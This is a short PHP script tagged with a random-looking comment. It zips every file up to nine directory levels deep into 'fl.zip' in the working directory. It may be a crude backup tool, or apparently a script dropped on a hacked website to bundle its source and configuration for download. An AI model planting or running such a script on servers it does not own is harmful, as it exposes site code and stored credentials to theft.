<?php //NAFqca25716

$zip = new ZipArchive();
  $zip->open("fl.zip", ZIPARCHIVE::CREATE);
foreach (glob("*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*/*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*/*/*/*/*.*") as $fl) {$zip->addFile($fl);}
foreach (glob("*/*/*/*/*/*/*/*/*.*") as $fl) {$zip->addFile($fl);}
  $zip->close();
?>

